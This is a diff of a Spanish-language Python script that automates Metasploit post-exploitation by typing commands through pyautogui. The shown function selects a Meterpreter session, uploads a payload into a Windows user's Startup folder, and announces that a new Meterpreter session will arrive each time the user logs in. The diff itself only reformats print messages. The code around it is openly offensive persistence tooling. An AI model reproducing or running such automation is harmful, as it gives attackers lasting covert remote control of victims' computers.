@@ -520,16 +520,12 @@ if numero == 4:
                        
              pyautogui.write("sessions " + sessions +"")
              pyautogui.press("ENTER")
-             print(""" COPIE ESTE COMANDO PARA SEGUIR CON EL PROCESO 
-                   > cd C:\Users\practicas.ist\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
-		   """)
+             #print("""COPIE ESTE COMANDO PARA SEGUIR CON EL PROCESO > cd C:\Users\practicas.ist\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Star""")
              
              
              pyautogui.write("upload " + path_payload_pers +"")# añadir variable path del payload
              print("CADA VEZ QUE EL USUARIO INICIE SESION RECIBIRÁ UNA SESION METERPRETER")
-             print("""
-       
-             PUEDE DESPLEGAR UN LISTENER EN EL PUERTO "+ puerto +", {la persistencia se conecta por dicho puerto} """)
+             print("PUEDE DESPLEGAR UN LISTENER EN EL PUERTO "+ puerto +", {la persistencia se conecta por dicho puerto} ")
       
       
          auto_pers_startup()
